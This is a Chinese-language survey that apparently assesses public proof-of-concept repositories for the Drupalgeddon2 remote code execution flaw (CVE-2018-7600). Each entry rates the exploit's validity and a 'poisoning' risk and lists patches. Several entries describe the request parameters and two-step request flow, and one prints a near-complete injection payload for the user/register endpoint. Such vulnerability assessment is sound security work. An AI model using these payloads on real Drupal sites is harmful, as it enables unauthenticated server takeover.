提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

